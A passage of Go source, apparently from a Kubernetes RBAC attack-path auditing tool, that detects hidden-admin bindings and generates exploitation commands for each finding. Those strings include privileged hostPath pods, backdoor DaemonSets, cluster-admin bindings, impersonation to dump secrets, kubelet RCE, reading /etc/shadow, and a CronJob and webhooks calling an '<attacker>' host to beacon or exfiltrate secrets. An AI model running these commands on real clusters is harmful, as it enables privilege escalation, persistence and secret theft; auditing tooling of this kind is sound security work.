			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List network policies\n")
		sections.WriteString("kubectl get networkpolicies -A\n\n")
		sections.WriteString("# Delete network policy to remove restrictions\n")
		sections.WriteString("kubectl delete networkpolicy <policy-name> -n <namespace>\n\n")
		sections.WriteString("# Or modify to allow all traffic\n")
		sections.WriteString("kubectl patch networkpolicy <policy-name> -n <namespace> --type=json -p='[{\"op\":\"replace\",\"path\":\"/spec/ingress\",\"value\":[{}]},{\"op\":\"replace\",\"path\":\"/spec/egress\",\"value\":[{}]}]'\n")
		sections.WriteString("```\n\n")
	}

	// CRD Policy Bypass (Istio, Cilium, Calico)
	if len(categories["CRD Policy Bypass"]) > 0 {
		sections.WriteString("## CRD Network Policy Bypass\n\n")
		sections.WriteString("Principals with CRD policy modification can bypass service mesh and CNI policies.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["CRD Policy Bypass"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List Istio authorization policies\n")
		sections.WriteString("kubectl get authorizationpolicies -A\n\n")
		sections.WriteString("# Delete Istio policy\n")
		sections.WriteString("kubectl delete authorizationpolicy <policy-name> -n <namespace>\n\n")
		sections.WriteString("# List Cilium network policies\n")
		sections.WriteString("kubectl get ciliumnetworkpolicies -A\n\n")
		sections.WriteString("# List Calico network policies\n")
		sections.WriteString("kubectl get networkpolicies.projectcalico.org -A\n")
		sections.WriteString("```\n\n")
	}

	// Ingress Manipulation
	if len(categories["Ingress"]) > 0 {
		sections.WriteString("## Ingress Manipulation\n\n")
		sections.WriteString("Principals with ingress modification can redirect traffic for interception or lateral movement.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Ingress"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List ingresses\n")
		sections.WriteString("kubectl get ingress -A\n\n")
		sections.WriteString("# Modify ingress to redirect traffic to attacker-controlled backend\n")
		sections.WriteString("kubectl patch ingress <name> -n <namespace> --type=json -p='[\n")
		sections.WriteString("  {\"op\":\"replace\",\"path\":\"/spec/rules/0/http/paths/0/backend/service/name\",\"value\":\"attacker-service\"}\n")
		sections.WriteString("]'\n\n")
		sections.WriteString("# Add new path to intercept specific traffic\n")
		sections.WriteString("kubectl patch ingress <name> -n <namespace> --type=json -p='[\n")
		sections.WriteString("  {\"op\":\"add\",\"path\":\"/spec/rules/0/http/paths/-\",\"value\":{\n")
		sections.WriteString("    \"path\":\"/api/sensitive\",\n")
		sections.WriteString("    \"pathType\":\"Prefix\",\n")
		sections.WriteString("    \"backend\":{\"service\":{\"name\":\"attacker-svc\",\"port\":{\"number\":80}}}\n")
		sections.WriteString("  }}\n")
		sections.WriteString("]'\n")
		sections.WriteString("```\n\n")
	}

	// Namespace Discovery
	if len(categories["Namespace Discovery"]) > 0 {
		sections.WriteString("## Namespace Discovery\n\n")
		sections.WriteString("Principals with namespace access can discover lateral movement targets.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Namespace Discovery"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List all namespaces\n")
		sections.WriteString("kubectl get namespaces\n\n")
		sections.WriteString("# Check for interesting labels\n")
		sections.WriteString("kubectl get namespaces --show-labels\n")
		sections.WriteString("```\n\n")
	}

	// Pod Discovery
	if len(categories["Pod Discovery"]) > 0 {
		sections.WriteString("## Pod Discovery\n\n")
		sections.WriteString("Principals with pod list/get access can discover targets for lateral movement.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Pod Discovery"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List all pods with details\n")
		sections.WriteString("kubectl get pods -A -o wide\n\n")
		sections.WriteString("# Find pods with specific labels (e.g., databases)\n")
		sections.WriteString("kubectl get pods -A -l app=postgres -o wide\n")
		sections.WriteString("kubectl get pods -A -l app=mysql -o wide\n")
		sections.WriteString("kubectl get pods -A -l app=redis -o wide\n\n")
		sections.WriteString("# Find pods with hostNetwork (potential node access)\n")
		sections.WriteString("kubectl get pods -A -o json | jq '.items[] | select(.spec.hostNetwork==true) | {name: .metadata.name, namespace: .metadata.namespace}'\n\n")
		sections.WriteString("# Find privileged pods (potential container escape)\n")
		sections.WriteString("kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | {name: .metadata.name, namespace: .metadata.namespace}'\n\n")
		sections.WriteString("# Get pod IPs for direct network access\n")
		sections.WriteString("kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: {.status.podIP}{\"\\n\"}{end}'\n")
		sections.WriteString("```\n\n")
	}

	return sections.String()
}

func generateExploitCommand(pathType, verb, resource, scope, principal string) string {
	namespaceFlag := ""
	if scope != "cluster" {
		namespaceFlag = fmt.Sprintf("-n %s ", scope)
	}

	// =========================================================================
	// Resource-specific exploit commands (shared across path types)
	// These are checked first since many resources appear in multiple path types.
	// =========================================================================

	switch resource {

	// --- nodes/proxy RCE ---
	case "nodes/proxy":
		return `# nodes/proxy RCE - execute commands on any pod via kubelet API (ref: grahamhelton.com/blog/nodes-proxy-rce)
# 1. Get a token: TOKEN=$(kubectl create token <sa-name>)
# 2. Get node IPs: kubectl get nodes -o wide
# 3. List pods on node: curl -sk -H "Authorization: Bearer $TOKEN" https://<NODE_IP>:10250/pods
# 4. Execute command on any pod:
websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://<NODE_IP>:10250/exec/<namespace>/<pod>/<container>?output=1&error=1&command=id"`

	// --- Pod creation / execution ---
	case "pods":
		switch verb {
		case "create":
			return fmt.Sprintf(`# Create a privileged pod with host access
kubectl %srun privesc --image=alpine --restart=Never --overrides='{
  "spec":{
    "serviceAccountName":"%s",
    "hostNetwork":true,"hostPID":true,"hostIPC":true,
    "containers":[{
      "name":"privesc","image":"alpine",
      "command":["sh","-c","sleep 3600"],
      "securityContext":{"privileged":true},
      "volumeMounts":[{"name":"host","mountPath":"/host"}]
    }],
    "volumes":[{"name":"host","hostPath":{"path":"/"}}]
  }
}' -- sleep 3600`, namespaceFlag, principal)
		case "patch", "update":
			return fmt.Sprintf(`# Modify existing pod to inject a privileged container or change service account
kubectl %spatch pod <pod-name> --type=json -p='[{"op":"add","path":"/spec/containers/-","value":{"name":"inject","image":"alpine","command":["sh","-c","sleep 3600"],"securityContext":{"privileged":true}}}]'`, namespaceFlag)
		case "list", "get":
			return fmt.Sprintf("kubectl %sget pods -o wide --show-labels", namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s pods", namespaceFlag, verb)
		}

	case "pods/exec":
		if pathType == "exfil" {
			return fmt.Sprintf("kubectl %sexec <pod-name> -- cat /etc/shadow /proc/self/environ", namespaceFlag)
		}
		return fmt.Sprintf("kubectl %sexec -it <pod-name> -- /bin/sh", namespaceFlag)

	case "pods/attach":
		return fmt.Sprintf("kubectl %sattach -it <pod-name>", namespaceFlag)

	case "pods/portforward":
		return fmt.Sprintf("kubectl %sport-forward <pod-name> 8080:80", namespaceFlag)

	case "pods/log":
		return fmt.Sprintf("kubectl %slogs <pod-name> --all-containers --prefix", namespaceFlag)

	// --- Workload creation ---
	case "deployments":
		switch verb {
		case "create":
			return fmt.Sprintf(`# Create a deployment with a privileged service account
kubectl %screate deployment backdoor --image=alpine -- sh -c "sleep 3600"
# Then patch to use a privileged SA:
kubectl %spatch deployment backdoor -p '{"spec":{"template":{"spec":{"serviceAccountName":"<target-sa>"}}}}'`, namespaceFlag, namespaceFlag)
		case "patch", "update":
			return fmt.Sprintf(`# Modify deployment to inject a backdoor container or change the service account
kubectl %spatch deployment <deployment-name> -p '{"spec":{"template":{"spec":{"serviceAccountName":"<target-sa>","containers":[{"name":"inject","image":"alpine","command":["sh","-c","sleep 3600"]}]}}}}'`, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s deployments", namespaceFlag, verb)
		}

	case "daemonsets":
		switch verb {
		case "create":
			return fmt.Sprintf(`# Create a DaemonSet to run on every node (persistence + lateral movement)
kubectl %sapply -f - <<'EOF'
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-backdoor
spec:
  selector:
    matchLabels: {app: node-backdoor}
  template:
    metadata:
      labels: {app: node-backdoor}
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: backdoor
        image: alpine
        command: ["sh", "-c", "sleep 3600"]
        securityContext: {privileged: true}
        volumeMounts: [{name: host, mountPath: /host}]
      volumes: [{name: host, hostPath: {path: /}}]
EOF`, namespaceFlag)
		case "patch", "update":
			return fmt.Sprintf(`kubectl %spatch daemonset <ds-name> -p '{"spec":{"template":{"spec":{"containers":[{"name":"inject","image":"alpine","command":["sh","-c","sleep 3600"],"securityContext":{"privileged":true}}]}}}}'`, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s daemonsets", namespaceFlag, verb)
		}

	case "statefulsets":
		switch verb {
		case "create":
			return fmt.Sprintf(`kubectl %sapply -f - <<'EOF'
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: backdoor-sts
spec:
  serviceName: backdoor
  replicas: 1
  selector:
    matchLabels: {app: backdoor}
  template:
    metadata:
      labels: {app: backdoor}
    spec:
      serviceAccountName: <target-sa>
      containers:
      - name: shell
        image: alpine
        command: ["sh", "-c", "sleep 3600"]
EOF`, namespaceFlag)
		case "patch", "update":
			return fmt.Sprintf(`kubectl %spatch statefulset <sts-name> -p '{"spec":{"template":{"spec":{"serviceAccountName":"<target-sa>"}}}}'`, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s statefulsets", namespaceFlag, verb)
		}

	case "replicasets":
		switch verb {
		case "create":
			return fmt.Sprintf(`kubectl %sapply -f - <<'EOF'
apiVersion: apps/v1
kind: ReplicaSet
metadata:
  name: backdoor-rs
spec:
  replicas: 1
  selector:
    matchLabels: {app: backdoor}
  template:
    metadata:
      labels: {app: backdoor}
    spec:
      serviceAccountName: <target-sa>
      containers:
      - name: shell
        image: alpine
        command: ["sh", "-c", "sleep 3600"]
EOF`, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s replicasets", namespaceFlag, verb)
		}

	case "jobs":
		switch verb {
		case "create":
			return fmt.Sprintf(`# Create a job with a privileged service account
kubectl %screate job pwn --image=alpine -- sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
# Or with a target SA:
kubectl %sapply -f - <<'EOF'
apiVersion: batch/v1
kind: Job
metadata:
  name: exfil-job
spec:
  template:
    spec:
      serviceAccountName: <target-sa>
      containers:
      - name: exfil
        image: alpine
        command: ["sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token"]
      restartPolicy: Never
EOF`, namespaceFlag, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s jobs", namespaceFlag, verb)
		}

	case "cronjobs":
		return fmt.Sprintf(`# Create a CronJob for persistent access
kubectl %sapply -f - <<'EOF'
apiVersion: batch/v1
kind: CronJob
metadata:
  name: persistent-access
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: <target-sa>
          containers:
          - name: beacon
            image: alpine
            command: ["sh", "-c", "wget -q -O- http://<attacker>/beacon"]
          restartPolicy: Never
EOF`, namespaceFlag)

	// --- RBAC Escalation ---
	case "clusterrolebindings":
		if verb == "create" {
			return fmt.Sprintf("kubectl create clusterrolebinding escalate-binding --clusterrole=cluster-admin --user=%s", principal)
		}
		return fmt.Sprintf("kubectl %s%s clusterrolebindings", namespaceFlag, verb)

	case "rolebindings":
		if verb == "create" {
			return fmt.Sprintf("kubectl %screate rolebinding escalate-binding --clusterrole=admin --user=%s", namespaceFlag, principal)
		}
		return fmt.Sprintf("kubectl %s%s rolebindings", namespaceFlag, verb)

	case "clusterroles":
		switch verb {
		case "bind":
			return fmt.Sprintf("kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=%s", principal)
		case "escalate":
			return fmt.Sprintf(`# Escalate a role to add permissions you don't have
kubectl patch clusterrole <role-name> --type=json -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'`)
		case "update", "patch":
			return fmt.Sprintf(`# Modify a ClusterRole to add cluster-admin equivalent permissions
kubectl %s %s clusterrole <role-name> --type=json -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'`, verb, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s clusterroles", namespaceFlag, verb)
		}

	case "roles":
		switch verb {
		case "bind":
			return fmt.Sprintf("kubectl %screate rolebinding pwn --clusterrole=admin --user=%s", namespaceFlag, principal)
		case "escalate":
			return fmt.Sprintf(`# Escalate a namespaced role to add permissions you don't have
kubectl %spatch role <role-name> --type=json -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'`, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s roles", namespaceFlag, verb)
		}

	// --- Impersonation ---
	case "users":
		if verb == "impersonate" {
			return fmt.Sprintf("kubectl --as=system:admin %sget secrets --all-namespaces", namespaceFlag)
		}
	case "groups":
		if verb == "impersonate" {
			return fmt.Sprintf("kubectl --as-group=system:masters --as=dummy %sget secrets --all-namespaces", namespaceFlag)
		}
	case "serviceaccounts":
		if verb == "impersonate" {
			return fmt.Sprintf("kubectl --as=system:serviceaccount:kube-system:default %sget secrets", namespaceFlag)
		}
	case "userextras/*":
		if verb == "impersonate" {
			return fmt.Sprintf("kubectl --as=system:admin --as-group=system:masters %sget secrets --all-namespaces", namespaceFlag)
		}

	// --- Service Account Tokens ---
	case "serviceaccounts/token":
		return fmt.Sprintf("kubectl %screate token <service-account-name>", namespaceFlag)

	case "tokenrequests":
		return fmt.Sprintf(`kubectl %sapply -f - <<'EOF'
apiVersion: authentication.k8s.io/v1
kind: TokenRequest
metadata:
  name: <sa-name>
  namespace: <namespace>
spec:
  audiences: ["https://kubernetes.default.svc"]
  expirationSeconds: 86400
EOF`, namespaceFlag)

	// --- Node Access ---
	case "nodes":
		switch verb {
		case "create":
			return `# Register a rogue node to steal secrets
# Requires crafting a Node object and faking kubelet - see: https://github.com/nicholasgasior/fake-kubelet
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Node
metadata:
  name: rogue-node
  labels:
    kubernetes.io/os: linux
EOF`
		case "update", "patch":
			return fmt.Sprintf(`# Modify node labels/taints to attract pods with secrets
kubectl %s %s node <node-name> -p '{"metadata":{"labels":{"special":"true"}}}'`, verb, namespaceFlag)
		case "proxy":
			return `# Proxy to kubelet API for pod listing and exec
# List pods: kubectl get --raw "/api/v1/nodes/<node>/proxy/pods"
# Exec: kubectl get --raw "/api/v1/nodes/<node>/proxy/run/<namespace>/<pod>/<container>?cmd=id"
kubectl get --raw "/api/v1/nodes/<node-name>/proxy/pods"`
		case "get", "list":
			return fmt.Sprintf("kubectl %sget nodes -o wide", namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s nodes", namespaceFlag, verb)
		}

	// --- Webhooks ---
	case "validatingwebhookconfigurations":
		switch verb {
		case "create", "update", "patch":
			return `# Create/modify a validating webhook to intercept and deny all requests (DoS)
# Or redirect to attacker-controlled endpoint to exfil request data
kubectl apply -f - <<'EOF'
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: exfil-webhook
webhooks:
- name: exfil.attacker.com
  clientConfig:
    url: "https://<attacker>/webhook"
  rules:
  - apiGroups: [""]
    resources: ["secrets"]
    apiVersions: ["v1"]
    operations: ["CREATE","UPDATE"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
EOF`
		default:
			return fmt.Sprintf("kubectl %s%s validatingwebhookconfigurations", namespaceFlag, verb)
		}

	case "mutatingwebhookconfigurations":
		switch verb {
		case "create", "update", "patch":
			return `# Create/modify a mutating webhook to inject sidecars, modify env vars, or change images
kubectl apply -f - <<'EOF'
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: inject-webhook
webhooks:
- name: inject.attacker.com
  clientConfig:
    url: "https://<attacker>/mutate"
  rules:
  - apiGroups: [""]
    resources: ["pods"]
    apiVersions: ["v1"]
    operations: ["CREATE"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
EOF`
		default:
			return fmt.Sprintf("kubectl %s%s mutatingwebhookconfigurations", namespaceFlag, verb)
		}

	// --- Certificates ---
	case "certificatesigningrequests/approval":
		return `# Approve a CSR to generate a valid client certificate
# 1. Create a CSR: openssl req -new -key key.pem -out csr.pem -subj "/CN=system:admin/O=system:masters"
# 2. Submit: kubectl apply -f csr.yaml
# 3. Approve: kubectl certificate approve <csr-name>
kubectl certificate approve <csr-name>`

	// --- Secrets ---
	case "secrets":
		switch verb {
		case "get":
			if pathType == "exfil" {
				return fmt.Sprintf("kubectl %sget secrets -o json | jq '.items[].data | map_values(@base64d)'", namespaceFlag)
			}
			return fmt.Sprintf("kubectl %sget secrets -o yaml", namespaceFlag)
		case "list":
			if pathType == "exfil" {
				return fmt.Sprintf("kubectl %sget secrets -o json | jq '.items[] | {name: .metadata.name, type: .type, data: (.data | map_values(@base64d))}'", namespaceFlag)
			}
			return fmt.Sprintf("kubectl %sget secrets", namespaceFlag)
		case "*":
			return fmt.Sprintf("kubectl %sget secrets -o json | jq '.items[].data | map_values(@base64d)'", namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s secrets", namespaceFlag, verb)
		}

	// --- ConfigMaps ---
	case "configmaps":
		switch verb {
		case "get", "list":
			return fmt.Sprintf("kubectl %sget configmaps -o yaml", namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s configmaps", namespaceFlag, verb)
		}

	// --- Services / Endpoints ---
	case "services":
		return fmt.Sprintf("kubectl %sget services -o wide", namespaceFlag)

	case "endpoints":
		return fmt.Sprintf("kubectl %sget endpoints -o wide", namespaceFlag)

	// --- Network policies ---
	case "networkpolicies":
		switch verb {
		case "delete":
			return fmt.Sprintf("kubectl %sdelete networkpolicy <policy-name>", namespaceFlag)
		case "update", "patch":
			return fmt.Sprintf(`# Modify network policy to allow all traffic
kubectl %spatch networkpolicy <policy-name> --type=json -p='[{"op":"replace","path":"/spec/ingress","value":[{}]},{"op":"replace","path":"/spec/egress","value":[{}]}]'`, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s networkpolicies", namespaceFlag, verb)
		}

	// --- Namespaces ---
	case "namespaces":
		return fmt.Sprintf("kubectl %sget namespaces", namespaceFlag)

	// --- Ingresses ---
	case "ingresses":
		switch verb {
		case "update", "patch":
			return fmt.Sprintf(`# Modify ingress to redirect traffic to attacker endpoint
kubectl %spatch ingress <ingress-name> --type=json -p='[{"op":"replace","path":"/spec/rules/0/http/paths/0/backend/service/name","value":"attacker-svc"}]'`, namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s ingresses", namespaceFlag, verb)
		}

	// --- PersistentVolumes ---
	case "persistentvolumes":
		if verb == "create" {
			return `# Create a hostPath PV to access the node filesystem
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: PersistentVolume
metadata:
  name: node-root
spec:
  capacity: {storage: 100Gi}
  accessModes: [ReadWriteOnce]
  hostPath:
    path: /
    type: Directory
EOF`
		}
		return fmt.Sprintf("kubectl %s%s persistentvolumes", namespaceFlag, verb)

	case "persistentvolumeclaims":
		switch verb {
		case "create":
			return fmt.Sprintf(`# Create a PVC to mount an existing PV with sensitive data
kubectl %sapply -f - <<'EOF'
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: data-access
spec:
  accessModes: [ReadWriteOnce]
  resources:
    requests: {storage: 10Gi}
  volumeName: <target-pv-name>
EOF`, namespaceFlag)
		case "get", "list":
			return fmt.Sprintf("kubectl %sget pvc -o wide", namespaceFlag)
		default:
			return fmt.Sprintf("kubectl %s%s pvc", namespaceFlag, verb)
		}

	// --- CRD Management ---
	case "customresourcedefinitions":
		switch verb {
		case "create":
			return `# Create a CRD without validation to inject arbitrary data into controllers
kubectl apply -f - <<'EOF'
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: exploits.attacker.example.com
spec:
  group: attacker.example.com
  names:
    kind: Exploit
    plural: exploits
  scope: Namespaced
  versions:
  - name: v1
    served: true
    storage: true
    schema:
      openAPIV3Schema:
        type: object
        x-kubernetes-preserve-unknown-fields: true
EOF`
		case "delete":
			return "# Delete a CRD to disrupt controllers (deletes ALL custom resources of that type!)\nkubectl delete crd <crd-name>"
		case "update", "patch":
			return fmt.Sprintf(`# Remove validation from an existing CRD
kubectl %s crd <crd-name> --type=json -p='[{"op":"replace","path":"/spec/versions/0/schema/openAPIV3Schema","value":{"type":"object","x-kubernetes-preserve-unknown-fields":true}}]'`, verb)
		default:
			return fmt.Sprintf("kubectl %s%s customresourcedefinitions", namespaceFlag, verb)
		}
	}

	// =========================================================================
	// Fallback: generic command
	// =========================================================================
	return fmt.Sprintf("kubectl %s%s %s", namespaceFlag, verb, resource)
}

// AnalyzeHiddenAdmins finds hidden administrative access patterns in RBAC configuration.
// This includes:
// - Principals bound to cluster-admin or system:masters group
// - Principals with RBAC modification capabilities
// - Principals with impersonation rights
// - Principals with certificate approval permissions
// - Aggregation roles that accumulate dangerous permissions
// - Wildcard group bindings
// - Default service accounts with elevated permissions
func (s *AttackPathService) AnalyzeHiddenAdmins(ctx context.Context) (*HiddenAdminData, error) {
	cacheKey := sdk.CacheKey("k8s-attackpaths", "hiddenadmins")

	// Check cache first
	if cached, found := sdk.Get(cacheKey); found {
		if result, ok := cached.(*HiddenAdminData); ok {
			return result, nil
		}
	}

	result := &HiddenAdminData{
		ClusterAdmins:       []HiddenAdminFinding{},
		RBACModifiers:       []HiddenAdminFinding{},
		Impersonators:       []HiddenAdminFinding{},
		CertApprovers:       []HiddenAdminFinding{},
		AggregationRoles:    []HiddenAdminFinding{},
		WildcardBindings:    []HiddenAdminFinding{},
		DefaultSAElevations: []HiddenAdminFinding{},
		AllFindings:         []HiddenAdminFinding{},
	}

	// Get all RBAC objects
	crbsList, err := sdk.GetClusterRoleBindings(ctx, s.clientset)
	if err != nil {
		return nil, fmt.Errorf("failed to list ClusterRoleBindings: %w", err)
	}

	clusterRolesList, err := sdk.GetClusterRoles(ctx, s.clientset)
	if err != nil {
		return nil, fmt.Errorf("failed to list ClusterRoles: %w", err)
	}

	// Build ClusterRole map
	crMap := make(map[string]*v1.ClusterRole)
	for i := range clusterRolesList {
		crMap[clusterRolesList[i].Name] = &clusterRolesList[i]
	}

	// Check for aggregation roles
	aggregationRoleNames := make(map[string]bool)
	for _, cr := range clusterRolesList {
		if cr.AggregationRule != nil && len(cr.AggregationRule.ClusterRoleSelectors) > 0 {
			aggregationRoleNames[cr.Name] = true
		}
	}

	// Analyze ClusterRoleBindings
	for _, crb := range crbsList {
		cr, ok := crMap[crb.RoleRef.Name]
		if !ok {
			continue
		}

		for _, subject := range crb.Subjects {
			principal := formatPrincipal(subject)

			// Check 1: cluster-admin or system:masters binding
			if crb.RoleRef.Name == "cluster-admin" || subject.Name == "system:masters" {
				finding := HiddenAdminFinding{
					Principal:      principal,
					PrincipalType:  subject.Kind,
					Namespace:      subject.Namespace,
					Scope:          "cluster",
					RoleName:       crb.RoleRef.Name,
					BindingName:    crb.Name,
					RiskLevel:      shared.RiskCritical,
					Permissions:    []string{"*/*:*"},
					Description:    fmt.Sprintf("%s has cluster-admin access via %s", principal, crb.Name),
					IsWildcard:     subject.Kind == "Group" && (subject.Name == "system:masters" || strings.HasPrefix(subject.Name, "*")),
					IsDefault:      subject.Kind == "ServiceAccount" && subject.Name == "default",
					Feasibility:    "Immediate",
					AttackSteps:    []string{"Has full cluster-admin privileges"},
					ExploitCommand: fmt.Sprintf("kubectl --as=%s get secrets -A", principal),
				}
				result.ClusterAdmins = append(result.ClusterAdmins, finding)
				result.AllFindings = append(result.AllFindings, finding)
				continue
			}

			// Check 2: Aggregation role binding
			if aggregationRoleNames[crb.RoleRef.Name] {
				finding := HiddenAdminFinding{
					Principal:      principal,
					PrincipalType:  subject.Kind,
					Namespace:      subject.Namespace,
					Scope:          "cluster",
					RoleName:       crb.RoleRef.Name,
					BindingName:    crb.Name,
					RiskLevel:      shared.RiskHigh,
					Permissions:    []string{"aggregated"},
					Description:    fmt.Sprintf("%s bound to aggregation role %s - permissions may grow as new roles are added", principal, crb.RoleRef.Name),
					IsAggregation:  true,
					Feasibility:    "Requires-Enum",
					AttackSteps:    []string{"Enumerate aggregated permissions", "Check for newly added dangerous permissions"},
					ExploitCommand: fmt.Sprintf("kubectl get clusterrole %s -o yaml | grep -A 100 'rules:'", crb.RoleRef.Name),
				}
				result.AggregationRoles = append(result.AggregationRoles, finding)
				result.AllFindings = append(result.AllFindings, finding)
			}

			// Check 3: Wildcard group binding
			if subject.Kind == "Group" && strings.Contains(subject.Name, "*") {
				finding := HiddenAdminFinding{
					Principal:      principal,
					PrincipalType:  subject.Kind,
					Namespace:      subject.Namespace,
					Scope:          "cluster",
					RoleName:       crb.RoleRef.Name,
					BindingName:    crb.Name,
					RiskLevel:      shared.RiskHigh,
					Permissions:    extractPermissionsFromRules(cr.Rules),
					Description:    fmt.Sprintf("Wildcard group %s may match unintended users", subject.Name),
					IsWildcard:     true,
					Feasibility:    "Requires-Enum",
					AttackSteps:    []string{"Create user that matches wildcard pattern", "Authenticate to gain these permissions"},
					ExploitCommand: fmt.Sprintf("# Group pattern: %s\n# Create a user/SA that matches this pattern", subject.Name),
				}
				result.WildcardBindings = append(result.WildcardBindings, finding)
				result.AllFindings = append(result.AllFindings, finding)
			}

			// Check 4: Default SA with elevated permissions
			if subject.Kind == "ServiceAccount" && subject.Name == "default" {
				hasDangerousPerms := false
				for _, rule := range cr.Rules {
					for _, verb := range rule.Verbs {
						for _, resource := range rule.Resources {
							apiGroups := rule.APIGroups
							if len(apiGroups) == 0 {
								apiGroups = []string{""}
							}
							for _, apiGroup := range apiGroups {
								if len(FindMatchingHiddenAdminPermissions(verb, resource, apiGroup)) > 0 ||
									len(FindMatchingPrivescPermissions(verb, resource, apiGroup)) > 0 {
									hasDangerousPerms = true
									break
								}
							}
							if hasDangerousPerms {
								break
							}
						}
						if hasDangerousPerms {
							break
						}
					}
					if hasDangerousPerms {
						break
					}
				}
				if hasDangerousPerms {
					finding := HiddenAdminFinding{
						Principal:      principal,
						PrincipalType:  subject.Kind,
						Namespace:      subject.Namespace,
						Scope:          "cluster",
						RoleName:       crb.RoleRef.Name,
						BindingName:    crb.Name,
						RiskLevel:      shared.RiskHigh,
						Permissions:    extractPermissionsFromRules(cr.Rules),
						Description:    fmt.Sprintf("Default SA in %s has elevated permissions - any pod without explicit SA inherits these", subject.Namespace),
						IsDefault:      true,
						Feasibility:    "Immediate",
						AttackSteps:    []string{"Deploy pod in namespace without specifying serviceAccountName", "Pod automatically gets default SA permissions"},
						ExploitCommand: fmt.Sprintf("kubectl -n %s run pwn --image=alpine -- sleep 3600 && kubectl -n %s exec pwn -- cat /var/run/secrets/kubernetes.io/serviceaccount/token", subject.Namespace, subject.Namespace),
					}
					result.DefaultSAElevations = append(result.DefaultSAElevations, finding)
					result.AllFindings = append(result.AllFindings, finding)
				}
			}

			// Check 5: RBAC modification, impersonation, and certificate permissions
			for _, rule := range cr.Rules {
				for _, verb := range rule.Verbs {
					for _, resource := range rule.Resources {
						apiGroups := rule.APIGroups
						if len(apiGroups) == 0 {
							apiGroups = []string{""}
						}

						for _, apiGroup := range apiGroups {
							matches := FindMatchingHiddenAdminPermissions(verb, resource, apiGroup)
							for _, match := range matches {
								finding := HiddenAdminFinding{
									Principal:      principal,
									PrincipalType:  subject.Kind,
									Namespace:      subject.Namespace,
									Scope:          "cluster",
									RoleName:       crb.RoleRef.Name,
									BindingName:    crb.Name,
									RiskLevel:      match.RiskLevel,
									Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
									Description:    match.Description,
									Feasibility:    determineFeasibility(match.Category),
									AttackSteps:    getAttackSteps(match.Category),
									ExploitCommand: generateHiddenAdminExploitCommand(match.Category, verb, resource, principal),
								}

								switch match.Category {
								case "RBAC Modification", "RBAC Escalation", "Full RBAC Control":
									result.RBACModifiers = append(result.RBACModifiers, finding)
								case "Impersonation":
									result.Impersonators = append(result.Impersonators, finding)
								case "Certificate Approval":
									result.CertApprovers = append(result.CertApprovers, finding)
								}
								result.AllFindings = append(result.AllFindings, finding)
							}
						}
					}
				}
			}
		}
	}

	// Also check namespace-level RoleBindings for hidden admin patterns
	allRbs, err := sdk.GetRoleBindings(ctx, s.clientset)
	if err == nil {
		allRoles, _ := sdk.GetRoles(ctx, s.clientset)
		roleMap := make(map[string]*v1.Role)
		for i := range allRoles {
